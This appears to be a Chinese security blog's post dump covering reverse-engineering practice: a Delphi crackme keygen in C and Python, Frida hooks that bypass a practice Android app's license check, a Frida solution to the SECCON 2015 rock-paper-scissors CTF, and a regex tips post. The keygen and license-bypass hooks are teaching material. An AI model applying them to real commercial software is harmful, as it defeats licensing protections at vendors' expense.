通过Delphi的反编译工具Darkde4的过程窗口找到双击事件的RVA。下断点，分析。注意，在这之前必须取消单击事件的断点，否则无法断下来。 还是同样的套路，一轮循环的验证之后，才来到真正有用的部分。 [esi+0x30C]和0x3E作比较，如果成立，就把[esi+0x30C]赋值为0x85，也就满足了单击事件的条件。 也就是说必定有一个地方，是把[esi+0x30C]赋值为0x3E。如果满足了这个条件，那么双击事件校验通过，单击事件 也通过。 结论 [esi+0x30C]的值必须为0x3E 再次寻找突破口 根据双击事件经验 我们能猜测，肯定有一个地方是把0x3E赋值给了[esi+0x30C]。 那么我们直接在OD中，右键-&gt;查找所有常量，输入3E，看看能不能找到mov [esi+0x30C],0x3E这样一条指令。如果能，那么这个就是真正校验的地方。 拉到函数最上面 之前导入的IDA的注释显示这个是chkcode的校验事件。就是之前我们在Darkde4过程窗口里看到的checkcode的响应事件，这个应该就是真正的校验函数了。下断点，开始分析 chcode事件 首先获取用户名长度 然后将用户名长度+5，接着进行字符串拼接 拼接方式为黑头Sun Bird(用户名长度+5)dseloffc012-OK(用户名)，拼接好的字符串就是密码。 结果 接着输入用户名和序列号，根据之前的分析过程 我们需要先双击，再单击才能够校验成功 但是这里需要注意一点，在过程窗口中有一个KeyUp键盘弹起事件，在你输入序列号的时候 他会检测是否有键盘弹起，如果没有则不成功，这样做的目的是为了防止复制粘贴。破解的方法也很简单，在复制粘贴完序列号之后随便 按一个键(比如方向键 这样不会影响到输入结果)，接着双击再单击。可以看到，成功注册完成。 注册机编写 C 123456789101112131415#include &quot;pch.h&quot; #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main() { char key1[50] = &quot;黑头Sun Bird&quot;; char key2[50] = &quot;dseloffc-012-OK&quot;; char username[20] = { 0 }; printf(&quot;请输入用户名:&quot;); scanf_s(&quot;%s&quot;, username, 20); printf(&quot;序列号为:\\n&quot;); printf(&quot;%s%d%s%s\\n&quot;, key1, strlen(username)+5, key2, username); system(&quot;pause&quot;); } Python 123print(&quot;please input username&quot;)s = raw_input()print(&quot;黑头Sun Bird&quot; + str(len(s)+5) + &quot;dseloffc-012-OK&quot; + s)","link":"/2021/01/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme4/"},{"title":"Hook框架Frida练习（1）","text":"文章涉及到的知识点： 怎么使用javascript实例化类并调用类方法 怎么在”jscode”中增加自定义javascript方法 怎么较为灵活的hook类方法 基础环境12345Mac Os 10.15.5Python 3.7Google Nexus 6P Anroid 6.0.1Frida官网：https://www.frida.re/Frida源码：https://github.com/frida apk的下载地址：whyshouldIpay 安装APK下载apk安装，先看看是什么功能，简单的使用后，了解到PREMIUM CONETNT内容需要输入License验证后才能查看。PREMIUM CONETNT按钮中的内容应该是答案。 流程分析使用jadx将apk反编译出来，分析，在AndroidManifest.xml中找到了启动的Activity是LauncherActivity 找到其中的主要代码进行分析 1234567891011121314151617181920212223242526public void verifyClick(View v) { //第一个验证，将输入的Licese通过网络验证，但这个肯定是通不过的，这是一个可 能需要绕过的点。 try { InputStream in = new URL(&quot;http://broken.license.server.com/query?license=&quot; + ((EditText) findViewById(R.id.text_license)).getText().toString()).openConnection().getInputStream(); StringBuilder responseBuilder = new StringBuilder(); byte[] b = new byte[0]; while (in.read(b) &gt; 0) { responseBuilder.append(b); } String response = responseBuilder.toString(); //网络验证需要服务器返回 &quot;LICENSEKEYOK&quot;，才能进行下一步 if (response.equals(&quot;LICENSEKEYOK&quot;)) { //当网络验证成功后，生成激活秘钥，并写入到preferences文件中 String activatedKey = new String(MainActivity.xor(getMac().getBytes(), response.getBytes())); SharedPreferences.Editor editor = getApplicationContext().getSharedPreferences(&quot;preferences&quot;, 0).edit(); editor.putString(&quot;KEY&quot;, activatedKey); //这样便成功激活 editor.commit(); new AlertDialog.Builder(this).setTitle(&quot;Activation successful&quot;).setMessage(&quot;Activation successful&quot;).setIcon(17301543).show(); return; } new AlertDialog.Builder(this).setTitle(&quot;Invalid license!&quot;).setMessage(&quot;Invalid license!&quot;).setIcon(17301543).show(); } catch (Exception e) { new AlertDialog.Builder(this).setTitle(&quot;Error occured&quot;).setMessage(&quot;Server unreachable&quot;).setNeutralButton(&quot;OK&quot;, (DialogInterface.OnClickListener) null).setIcon(17301543).show(); } } 在verifyClick中可以知道生成激活秘钥的算法是MainActivity.xor。 1String activatedKey = new String(MainActivity.xor(getMac().getBytes(), response.getBytes())); 到MainActivity中，查看该方法，看上去算起来还是比较麻烦。 1234567public static byte[] xor(byte[] val, byte[] key) { byte[] o = new byte[val.length]; for (int i = 0; i &lt; val.length; i++) { o[i] = (byte) (val[i] ^ key[i % key.length]); } return o;} 接下来当程序被激活成功后，点击PREMIUM CONETNT按钮，会调用MainActivity中的方法，可以看到它将MAC，以及生成的Key发送到了MainActivity中。 123456public void showPremium(View view) { Intent i = new Intent(this, MainActivity.class); i.putExtra(&quot;MAC&quot;, getMac()); i.putExtra(&quot;KEY&quot;, getKey()); startActivity(i); } 在MainActivity的onCreate方法中，看到了最终答案生成的native方法stringFromJNI(key, mac)。 12345678910111213protected void onCreate(Bundle savedInstanceState) { //获取Intent传递过来的值 String key = getIntent().getStringExtra(&quot;KEY&quot;); String mac = getIntent().getStringExtra(&quot;MAC&quot;); if (key == &quot;&quot; || mac == &quot;&quot;) { key = &quot;&quot;; mac = &quot;&quot;; } super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); //调用native函数，算出答案 ((TextView) findViewById(R.id.sample_text)).setText(stringFromJNI(key, mac)); } 大概过程如下： 输入License，进行验证 通过网络验证获取返回值“LICENSEKEYOK”后，然后调用MainActivity.xor在本地preferences文件中生成秘钥，激活成功。 本地获取MAC地址及秘钥Key传入MainActivity得出答案。 对hook点进行分析 获取getMac()函数的返回值，与“LICENSEKEYOK”字符串进行xor运算得出秘钥Key. hook getKey方法，让它不从preferences文件读取Key,而是我们自己构造。 hook verifyClick,让它调用showPremium方法 代码的构造与编写hook getMac()函数getMac() 在showPremium函数中调用，showPremium在LauncherActivity类中，所有直接通过this就能直接调用getMac()方法 123456789101112js_code = ''' Java.perform(function(){ var hook_Activity = Java.use('de.fraunhofer.sit.premiumapp.LauncherActivity'); hook_Activity.showPremium.implementation = function(v){ var Key = this.getKey(); var Mac = this.getMac(); send(Key); send(Mac); } });''' 完整的Python代码： 1234567891011121314151617181920212223242526272829# -*-coding:utf-8-*-import frida, sysdef on_message(message, data): if message['type'] == 'send': print(&quot;[*] {0}&quot;.format(message['payload'])) else: print(message)js_code = ''' Java.perform(function(){ var hook_Activity = Java.use('de.fraunhofer.sit.premiumapp.LauncherActivity'); hook_Activity.showPremium.implementation = function(v){ var Key = this.getKey(); var Mac = this.getMac(); send(Key); send(Mac); } });'''process = frida.get_usb_device().attach('de.fraunhofer.sit.premiumapp')script = process.create_script(js_code)script.on('message', on_message)script.load()sys.stdin.read() 计算密钥key接下来开始真正第一步的hook，将mac值与“LICENSEKEYOK”通过MainActivity.xor获取秘钥Key。那就直接hook getKey方法吧，这样可以自己来构造秘钥Key。仔细分析，会发现在这一步中可能会遇到下面的问题： 怎么调用xor方法。 java是强类型语言，javascript是弱类型语言，怎么将javascript参数进行类型转换并传递到java语言中。 怎么将javascript参数进行类型转换并传递到java语言中？其实方法很简单，既然java是强类型语言，那就根据它要求的类型传递对应参数即可，看看它参数的类型。 1234567public static byte[] xor(byte[] val, byte[] key) { byte[] o = new byte[val.length]; for (int i = 0; i &lt; val.length; i++) { o[i] = (byte) (val[i] ^ key[i % key.length]); } return o;} 那么，在javascript代码中，先准备一个将字符串类型转换为byte[]类型的方法stringToBytes，再通过实例化MainActivity类的方式调用xor()，然后还需要一个将byte[]回转为String的方法，因为秘钥key是Sting类型的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071js_code = ''' //字符串转换byte[]的方法 stringToBytes = function(str) { var ch, st, re = []; for (var i = 0; i &lt; str.length; i++ ) { ch = str.charCodeAt(i); st = []; do { st.push( ch &amp; 0xFF ); ch = ch &gt;&gt; 8; } while ( ch ); re = re.concat( st.reverse() ); } return re; } //将byte[]转成String的方法 function byteToString(arr) { if(typeof arr === 'string') { return arr; } var str = '', _arr = arr; for(var i = 0; i &lt; _arr.length; i++) { var one = _arr[i].toString(2), v = one.match(/^1+?(?=0)/); if(v &amp;&amp; one.length == 8) { var bytesLength = v[0].length; var store = _arr[i].toString(2).slice(7 - bytesLength); for(var st = 1; st &lt; bytesLength; st++) { store += _arr[st + i].toString(2).slice(2); } str += String.fromCharCode(parseInt(store, 2)); i += bytesLength - 1; } else { str += String.fromCharCode(_arr[i]); } } return str; } //hook 代码 Java.perform(function(){ var hook_Activity = Java.use('de.fraunhofer.sit.premiumapp.LauncherActivity'); var MainActivity = Java.use('de.fraunhofer.sit.premiumapp.MainActivity') var LicenseStr = &quot;LICENSEKEYOK&quot;; //hook getKey()方法，直接构造密码，而不从preferences读取 hook_Activity.getKey.implementation = function(){ //获取Mac var Mac = this.getMac(); //实例化MainActivity var instance = MainActivity.$new(); //类型转换 var MacByte =stringToBytes(Mac); var LicenseByte = stringToBytes(LicenseStr); send(&quot;MacByte:&quot;+MacByte) send(&quot;LicenseByte:&quot;+LicenseByte) //调用实例化对象的xor方法 xorResult = instance.xor(MacByte,LicenseByte); send(xorResult); //类型回转 var Key = byteToString(xorResult) send(Key); return Key; } hook_Activity.verifyClick.implementation = function(view){ this.showPremium(view); } });''' 接下来，执行看看，能不能获取秘钥Key。 调用showPremium获取答案前面2个步骤，可以说是已经完成90%了，接下来只需要在hook一个能够触发showPremium方法的即可。方法就随意了，这里采用hook verifyClick的方式，这样点击app上的VERIFY按钮，触发verifyClick方法去调用showPremium，进而获得最终答案。 123hook_Activity.verifyClick.implementation = function(view){ this.showPremium(view); } 启动脚本，点击app上的VERIFY按钮看看执行结果： 总结 任意类方法调用。 任意类方法重实现。以及学会怎么构造和使用自定义javascript方法。 参考链接： https://bbs.pediy.com/thread-227233.htm","link":"/2020/12/04/Android/frida/Hook%E6%A1%86%E6%9E%B6Frida%E7%BB%83%E4%B9%A0%EF%BC%881%EF%BC%89/"},{"title":"正则小技巧和数据过滤处理","text":"正则基础 首先讲一下正则的规则只需要管What How即可 其他无需考虑 匹配字符(What) . [abcd] [a-zA-Z] [^abcd] \\d \\s \\t \\w … 匹配数量(How) * + ? {n} {n,} {n,m} 子匹配 () 其他 a* Greedy 贪婪 a*? Lazy | 或 ^ $ 用法1使用数据如下： 1234567891011121314152 wangwei 200 false false 791 true 8 wangjing 200 false false 791 true 72 lihong 200 false false 791 true 94 wangxin 200 false false 791 true 107 liujuan 200 false false 791 true 119 zhangbo 200 false false 791 true 145 zhanghao 200 false false 791 true 169 zhangbin 200 false false 791 true 185 wangjing 200 false false 791 true 224 liuxin 200 false false 791 true 260 yanglin 200 false false 790 true 354 likai 200 false false 791 true 390 lixiang 200 false false 791 true 435 zhangbo 200 false false 791 true 436 wangxin 200 false false 791 true 推荐一个网站 https://regex101.com/ 打开进行正则匹配 直接生成Python脚本 复制对应代码： 1234567891011121314151617181920212223242526272829303132333435# coding=utf8# the above tag defines encoding for this document and is for Python 2.x compatibilityimport reregex = r&quot;(\\d+\\s+)(\\w+)(\\s\\d+\\s\\w+\\s\\w+\\s\\d+\\s\\w+)&quot;test_str = (&quot;2 wangwei 200 false false 791 true \\n&quot; &quot;8 wangjing 200 false false 791 true \\n&quot; &quot;72 lihong 200 false false 791 true \\n&quot; &quot;94 wangxin 200 false false 791 true \\n&quot; &quot;107 liujuan 200 false false 791 true \\n&quot; &quot;119 zhangbo 200 false false 791 true \\n&quot; &quot;145 zhanghao 200 false false 791 true \\n&quot; &quot;169 zhangbin 200 false false 791 true \\n&quot; &quot;185 wangjing 200 false false 791 true \\n&quot; &quot;224 liuxin 200 false false 791 true \\n&quot; &quot;260 yanglin 200 false false 790 true \\n&quot; &quot;354 likai 200 false false 791 true \\n&quot; &quot;390 lixiang 200 false false 791 true \\n&quot; &quot;435 zhangbo 200 false false 791 true \\n&quot; &quot;436 wangxin 200 false false 791 true &quot;)matches = re.finditer(regex, test_str, re.MULTILINE)for matchNum, match in enumerate(matches, start=1): print (&quot;Match {matchNum} was found at {start}-{end}: {match}&quot;.format(matchNum = matchNum, start = match.start(), end = match.end(), match = match.group())) for groupNum in range(0, len(match.groups())): groupNum = groupNum + 1 print (&quot;Group {groupNum} found at {start}-{end}: {group}&quot;.format(groupNum = groupNum, start = match.start(groupNum), end = match.end(groupNum), group = match.group(groupNum)))# Note: for Python 2.7 compatibility, use ur&quot;&quot; to prefix the regex and u&quot;&quot; to prefix the test string and substitution. 修改为： 123456789101112131415161718192021222324252627# coding=utf8# the above tag defines encoding for this document and is for Python 2.x compatibilityimport reregex = r&quot;(\\d+\\s+)(\\w+)(\\s\\d+\\s\\w+\\s\\w+\\s\\d+\\s\\w+)&quot;test_str = (&quot;2 wangwei 200 false false 791 true \\n&quot; &quot;8 wangjing 200 false false 791 true \\n&quot; &quot;72 lihong 200 false false 791 true \\n&quot; &quot;94 wangxin 200 false false 791 true \\n&quot; &quot;107 liujuan 200 false false 791 true \\n&quot; &quot;119 zhangbo 200 false false 791 true \\n&quot; &quot;145 zhanghao 200 false false 791 true \\n&quot; &quot;169 zhangbin 200 false false 791 true \\n&quot; &quot;185 wangjing 200 false false 791 true \\n&quot; &quot;224 liuxin 200 false false 791 true \\n&quot; &quot;260 yanglin 200 false false 790 true \\n&quot; &quot;354 likai 200 false false 791 true \\n&quot; &quot;390 lixiang 200 false false 791 true \\n&quot; &quot;435 zhangbo 200 false false 791 true \\n&quot; &quot;436 wangxin 200 false false 791 true &quot;)matches = re.finditer(regex, test_str, re.MULTILINE)for i in matches: print(i.group(2)) 用法2使用vim进行正则匹配 12:s/abc/def/g 用def替换abc，g为global全局的意思%s/200.*//g 1%s/\\(\\d\\+\\s\\)//g 参考链接： https://regex101.com/ https://www.runoob.com/python/python-reg-expressions.html https://www.cnblogs.com/penseur/archive/2011/02/25/1964522.html https://gist.github.com/JavaCS3/e36e494e78a02049950bfa7c7ebeb929","link":"/2021/01/05/WEB/%E6%AD%A3%E5%88%99%E5%B0%8F%E6%8A%80%E5%B7%A7%E5%92%8C%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4%E5%A4%84%E7%90%86/"},{"title":"Hook框架Frida","text":"0x00 概述Frida是个轻量级别的hook框架 是Python API，但JavaScript调试逻辑 Frida的核心是用C编写的，并将Google的V8引擎注入到目标进程中，在这些进程中，JS可以完全访问内存，挂钩函数甚至调用进程内的本机函数来执行。 使用Python和JS可以使用无风险的API进行快速开发。Frida可以帮助您轻松捕获JS中的错误并为您提供异常而不是崩溃。 。 关于frda学习路线了，Frida的学习还是蛮简单的，只需要了解两方面的内容： 1）主控端和目标进程的交互（message） 2）Python接口和js接口（查文档） frida框架分为两部分： 1）一部分是运行在系统上的交互工具frida CLI。 2）另一部分是运行在目标机器上的代码注入工具 frida-serve。 0x01 资源和环境12345Mac Os 10.15.5Python 3.7Google Nexus 6P Anroid 6.0.1Frida官网：https://www.frida.re/Frida源码：https://github.com/frida 0x02 运行模式Frida通过其强大的仪器核心Gum提供动态检测，Gum是用C语言编写的。因为这种检测逻辑很容易发生变化，所以通常需要用脚本语言编写，这样在开发和维护它时会得到一个简短的反馈循环。这就是GumJS发挥作用的地方。只需几行C就可以在运行时内运行一段JavaScript，它可以完全访问Gum的API，允许您挂钩函数，枚举加载的库，导入和导出的函数，读写内存，扫描模式的内存等 0x03 Frida安装123pip install fridapip install frida-toolsfrida --version 安卓端安装 1https://github.com/frida/frida/releases 1cat /proc/cpuinfo 看到我的cpu是armv8 64位的 所以对应的去下载相应的版本 123456adb push frida-server-12.11.17-android-arm64 /data/local/tmpadb shellsucd /data/local/tmpchmod 777 frida-server-12.11.17-android-arm64./frida-server-12.11.17-android-arm64 在bash下frida-ps -U 0x04 Hook示例的安装与分析Frida官网给我们了一个ctf的示例，就以此为例子，开始学习frida在android逆向的使用。rps.apk 下载地址 使用虚拟机或者自己的手机将应用安装好，发现是一个简单的石头剪刀布的游戏应用，简单的玩了一下，没什么特别的，直接分析代码吧，看看到底想干什么。 源代码分析使用jadx-gui反编译，发现app没有加壳和混淆，当然一来就加壳和混淆的话对我们就太不友好了，接下分析就简单了，直接看java代码。 在MainActivity中找到OnCreate()方法，可以看到只是简单的声明了button控件以及对应的监听器。 1234567891011protected void onCreate(Bundle paramBundle) { super.onCreate(paramBundle); setContentView(2130968600); this.P = (Button)findViewById(2131492941); this.S = (Button)findViewById(2131492943); this.r = (Button)findViewById(2131492942); this.P.setOnClickListener(this); this.r.setOnClickListener(this); this.S.setOnClickListener(this); this.flag = 0;} 继续查看button的onclick方法，可以看出cpu是通过随机数组出的，其判断输赢的方法在this.showMessageTask中。 12345678910111213141516171819202122232425262728public void onClick(View paramView) { if (this.flag == 1) return; this.flag = 1; ((TextView)findViewById(2131492946)).setText(&quot;&quot;); TextView textView1 = (TextView)findViewById(2131492944); TextView textView2 = (TextView)findViewById(2131492945); this.m = 0; this.n = (new Random()).nextInt(3); //随机数0，1，2 int i = this.n; (new String[3])[0] = &quot;CPU: Paper&quot;; (new String[3])[1] = &quot;CPU: Rock&quot;; (new String[3])[2] = &quot;CPU: Scissors&quot;; textView2.setText((new String[3])[i]); if (paramView == this.P) { textView1.setText(&quot;YOU: Paper&quot;); this.m = 0; } if (paramView == this.r) { textView1.setText(&quot;YOU: Rock&quot;); this.m = 1; } if (paramView == this.S) { textView1.setText(&quot;YOU: Scissors&quot;); this.m = 2; } this.handler.postDelayed(this.showMessageTask, 1000L); //输赢判断方法 } 跟进分析showMessageTask，可以看到如果赢了mainActivity.cnt会+1，但是一旦输了cnt就会置0，而获取flag的要求是我们得获胜1000次，…… :( 1234567891011121314151617181920212223242526private final Runnable showMessageTask = new Runnable() { public void run() { TextView textView = (TextView)MainActivity.this.findViewById(2131492946); if (MainActivity.this.n - MainActivity.this.m == 1) { MainActivity mainActivity = MainActivity.this; mainActivity.cnt++; textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt)); } else if (MainActivity.this.m - MainActivity.this.n == 1) { MainActivity.this.cnt = 0; textView.setText(&quot;LOSE +0&quot;); } else if (MainActivity.this.m == MainActivity.this.n) { textView.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt)); } else if (MainActivity.this.m &lt; MainActivity.this.n) { MainActivity.this.cnt = 0; textView.setText(&quot;LOSE +0&quot;); } else { MainActivity mainActivity = MainActivity.this; mainActivity.cnt++; textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt)); } if (1000 == MainActivity.this.cnt) textView.setText(&quot;SECCON{&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;}&quot;); MainActivity.this.flag = 0; } }; 简单分析一下获取flag需要的条件，总结有3个办法: 分析calc()方法能算出答案，但这个方法在so中，得分析汇编代码才行，当然可以尝试使用ida pro，F5查看C代码分析，前提是算法不难。 获取calc函数的返回值，从而计算答案。 还有一个方法就是，直接将MainActivity.this.cnt的值构造成1000。 接下来就用frida，使用后两种思路来解这个简单的示例。但在这之前得先了解Frida自带的Messages机制，了解frida怎么从通过一个python脚本发送和接收message消息是一个提升理解frida的好方法。 0x04 Frida自带的Messages机制与进程交互先来看看一个Messages的模板，这里用到的语言分别是python和javascript，他们之间的关系是python作为载体，javascript作为在android中真正执行代码。 123456789101112131415161718192021# -*-coding:utf-8-*-import frida, sys #hook代码，采用javascript编写jscode = &quot;&quot;&quot;//javascript代码，重点&quot;&quot;&quot; #自定义回调函数def on_message(message, data): if message['type'] == 'send': print(&quot;[*] {0}&quot;.format(message['payload'])) else: print(message) #重点的4行代码process = frida.get_usb_device().attach('应用完整包名')script = process.create_script(jscode)script.on('message', on_message)script.load()sys.stdin.read() 当然如果是对此简单的使用，只需要编写jscode，以及填写你要hook的应用完整包名就行了，不过如果单纯只会用可能在以后会被模板限制，所以一探究竟还是很有必要。可以在Bash中，使用python终端的help()函数找到frida库的源代码的绝对路径。 12import fridahelp(frida) 接下来就来具体看看这几句代码做了什么事情。 12345process = frida.get_usb_device().attach('应用完整包名')script = process.create_script(jscode)script.on('message', on_message)script.load()sys.stdin.read() 首先使用了frida.get_usb_device()，返回了一个_get_device函数，跟进_get_device方法。 12def get_usb_device(timeout = 0): return _get_device(lambda device: device.type == 'tether', timeout) 在_get_device中，通过get_device_manager()实例化DeviceManager类，并调用该类中的enumerate_devices()方法。 12345678910def _get_device(predicate, timeout): mgr = get_device_manager() //获取设备管理 def find_matching_device(): //寻找匹配设备 usb_devices = [device for device in mgr.enumerate_devices() if predicate(device)] if len(usb_devices) &gt; 0: return usb_devices[0] else: return None device = find_matching_device() ...省略 get_device_manager()代码 123456def get_device_manager(): global _device_manager if _device_manager is None: from . import core _device_manager = core.DeviceManager(_frida.DeviceManager()) return _device_manager DeviceManager中enumerate_devices(）方法，可以看到enumerate_devices()方法实际上是返回了一个Device()类的实例化对象List。 12345678910111213141516171819202122232425262728293031class DeviceManager(object): def __init__(self, impl): self._impl = impl def __repr__(self): return repr(self._impl) //返回了一个Device()类的实例化。 def enumerate_devices(self): return [Device(device) for device in self._impl.enumerate_devices()] def add_remote_device(self, host): return Device(self._impl.add_remote_device(host)) def remove_remote_device(self, host): self._impl.remove_remote_device(host) def get_device(self, device_id): devices = self._impl.enumerate_devices() if device_id is None: return Device(devices[0]) for device in devices: if device.id == device_id: return Device(device) raise _frida.InvalidArgumentError(&quot;unable to find device with id %s&quot; % device_id) def on(self, signal, callback): self._impl.on(signal, callback) def off(self, signal, callback): self._impl.off(signal, callback) 继续跟进Device类中的，就找到了attach()方法。在attach方法这是设置断点，看看传入的数据。 接下来提供的“应用完整名”是通过self._pid_of()函数去找到对应的进程号pid，然后将pid后通过Session类初始化。到此第一句代码过程就算是明白了，最终得到的是一个对应进程号pid的Session实例化对象process。 12345678910111213141516171819202122232425262728293031323334353637class Device(object): def __init__(self, device): self.id = device.id self.name = device.name self.icon = device.icon self.type = device.type self._impl = device def __repr__(self): return repr(self._impl) ...节省空间删除部分方法，详细内容可自行查看源码 def kill(self, target): self._impl.kill(self._pid_of(target)) //返回了一个Session的实例化对象 def attach(self, target): return Session(self._impl.attach(self._pid_of(target))) def inject_library_file(self, target, path, entrypoint, data): return self._impl.inject_library_file(self._pid_of(target), path, entrypoint, data) def inject_library_blob(self, target, blob, entrypoint, data): return self._impl.inject_library_blob(self._pid_of(target), blob, entrypoint, data) def on(self, signal, callback): self._impl.on(signal, callback) def off(self, signal, callback): self._impl.off(signal, callback) def _pid_of(self, target): if isinstance(target, numbers.Number): return target else: return self.get_process(target).pid 第二句，紧接着process.create_script(jscode)，可以看到它返回一个Script类的实例化，参数不确定。 12def create_script(self, *args, **kwargs): return Script(self._impl.create_script(*args, **kwargs)) 跟进Script类，可以找到on()方法，在on方法中可以设置自定义回调函数。 12345678910111213141516171819202122232425262728class Script(object): def __init__(self, impl): self.exports = ScriptExports(self) self._impl = impl self._on_message_callbacks = [] self._log_handler = self._on_log self._pending = {} self._next_request_id = 1 self._cond = threading.Condition() impl.on('destroyed', self._on_destroyed) impl.on('message', self._on_message) ...节省空间删除部分类方法，详细内容可自行查看源码 def load(self): self._impl.load() //设置自定义回调函数 def on(self, signal, callback): if signal == 'message': self._on_message_callbacks.append(callback) else: self._impl.on(signal, callback) 在IDE中可以看到_on_message_callbacks中存放的on_message函数地址。 接下来调用load()方法，在服务端就启动javascript脚本了，至于在frida-server服务端怎么执行的，可逆向研究一下frida-server，它才是真正的核心。 0x05 Javascript代码构造与执行方法一：获取calc()返回值第一种思路就是直接获取calc的返回值，从native函数定义上知道它的返回值是int类型，当然直接获取calc函数的返回值是解出问题最简单的方法。 1public native int calc(); 那怎么获取calc()函数的返回值呢，这个函数在MainActivity类中，直接引用该类下的calc()方法，不就ok了吗，原理是这样，下面就来构造一下Javascript代码。 123456789101112131415//Java.Perform 开始执行JavaScript脚本。Java.perform(function () {//定义变量MainActivity，Java.use指定要使用的类 var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity'); //hook该类下的onCreate方法，重新实现它 MainActivity.onClick.implementation = function () { send(&quot;Hook Start...&quot;); //调用calc()方法，获取返回值 var returnValue = this.calc(); send(&quot;Return:&quot;+returnValue); var result = (1000+returnValue)*107; //解出答案 send(&quot;Flag:&quot;+&quot;SECCON{&quot;+result.toString()+&quot;}&quot;); }}); JavaScript代码就是这样，如果不是很理解，学习一下JavaScript基础即可，下面看看完整的python脚本。 1234567891011121314151617181920212223242526272829# -*-coding:utf-8-*-import frida, sysdef on_message(message, data): if message['type'] == 'send': print(&quot;[*] {0}&quot;.format(message['payload'])) else: print(message)jscode = &quot;&quot;&quot;Java.perform(function () { var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity'); MainActivity.onClick.implementation = function () { send(&quot;Hook Start...&quot;); var returnValue = this.calc(); send(&quot;Return:&quot;+returnValue); var result = (1000+returnValue)*107; send(&quot;Flag:&quot;+&quot;SECCON{&quot;+result.toString()+&quot;}&quot;); }});&quot;&quot;&quot;process = frida.get_usb_device().attach('com.example.seccon2015.rock_paper_scissors')script = process.create_script(jscode)script.on('message', on_message)script.load()sys.stdin.read() 不知道为什么hook的为应用的onCreate方法始终不行所以hook对应的onClick方法进行结果如下 方法二：修改cnt的值为1000第二种思路也比较简单，我们需要修改cnt的值，但如果直接修改cnt的初始值为1000的话，在游戏中可能存在不确定因素，比如输了会置0，赢了cnt值就变成1001了，所以还得控制一下输赢，而输赢的条件是电脑出什么，所以最终hook的方法就在onClick中。从onClick()中可以知道，控制输赢的在于修改this.n 和 this.m的值，再来看看源代码。 1234567891011121314151617181920212223242526272829303132private final Runnable showMessageTask = new Runnable() { public void run() { TextView tv3 = (TextView) MainActivity.this.findViewById(R.id.textView3); MainActivity mainActivity; //我方:布 CPU：石头 or 我方：石头 CUP：剪刀 ，则为赢 if (MainActivity.this.n - MainActivity.this.m == 1) { mainActivity = MainActivity.this; mainActivity.cnt++; tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt)); //反过来当然是输咯 } else if (MainActivity.this.m - MainActivity.this.n == 1) { MainActivity.this.cnt = 0; tv3.setText(&quot;LOSE +0&quot;); //一样则打平 } else if (MainActivity.this.m == MainActivity.this.n) { tv3.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt)); //我布 cup:剪刀 } else if (MainActivity.this.m &lt; MainActivity.this.n) { MainActivity.this.cnt = 0; tv3.setText(&quot;LOSE +0&quot;); } else { mainActivity = MainActivity.this; mainActivity.cnt++; tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt)); } //获胜1000次则能够获取flag if (1000 == MainActivity.this.cnt) { tv3.setText(&quot;SECCON{&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;}&quot;); } MainActivity.this.flag = 0; } }; JavaScript代码编写如下 1234567891011121314Java.perform(function () { var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity'); //hook onClick方法，此处要注意的是onClick方法是传递了一个View参数v MainActivity.onClick.implementation = function (v) { send(&quot;Hook Start...&quot;); //调用onClick,模拟点击事件 this.onClick(v); //修改参数 满足第一个if 或者 最后一个else即可 this.n.value = 0; this.m.value = 2; this.cnt.value = 999; send(&quot;Success!&quot;) }}); 完整python代码 123456789101112131415161718192021222324252627import frida, sys def on_message(message, data): if message['type'] == 'send': print(&quot;[*] {0}&quot;.format(message['payload'])) else: print(message) jscode = &quot;&quot;&quot;Java.perform(function () { var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity'); MainActivity.onClick.implementation = function (v) { send(&quot;Hook Start...&quot;); this.onClick(v); this.n.value = 0; this.m.value = 2; this.cnt.value = 999; send(&quot;Success!&quot;) }});&quot;&quot;&quot; process = frida.get_usb_device().attach('com.example.seccon2015.rock_paper_scissors')script = process.create_script(jscode)script.on('message', on_message)script.load()sys.stdin.read() 执行python脚本，任意点击按钮，答案就出来了。 方法三：分析calc()方法算出答案calc() 这个方法在so中，对应的分析汇编代码 123456static { System.loadLibrary(&quot;calc&quot;);}public native int calc(); 直接使用ida pro或者radare2分析汇编代码也是可以的。这里给出用radare2反汇编出来的代码。可以看到，calc()函数就单纯的返回了int值7 0x06 总结一般分析流程 1231.反编译apk，分析代码寻找hook点。2.编写js代码，调用类的方法或者替换。3.在python中执行即可。 0x07 参考链接https://bbs.pediy.com/thread-227232.htm","link":"/2020/09/22/Android/frida/Hook%E6%A1%86%E6%9E%B6Frida/"},{"title":"Frida--Android逆向之动态加载dex Hook(上)","text":"基础环境1234567Mac Os 10.15.5Python 3.9jebjadxfridaapktoolMUMU模拟器 文章使用的是DDCTF2018的android逆向第二题Hello Baby Dex 示例地址：[下载](https://github.com/ghostmaze/Android-Reverse/blob/master/Hello Baby Dex/app-release.apk) 知识点1234Robust热修复框架原理Java 反射Robust类 hookfrida基础hook APK安装 输入字符并验证，错误会Toast出一些信息，可能输入正确的值才能过获取flag直接进入分析 静态代码分析导入jeb中查看AndroidManifest.xml 找到程序的入口MainActivity 123456 &lt;activity android:name=&quot;cn.chaitin.geektan.crackme.MainActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt;&lt;/activity&gt; 在命令行中使用apktool d xx.apk，将APK文件反编译出来 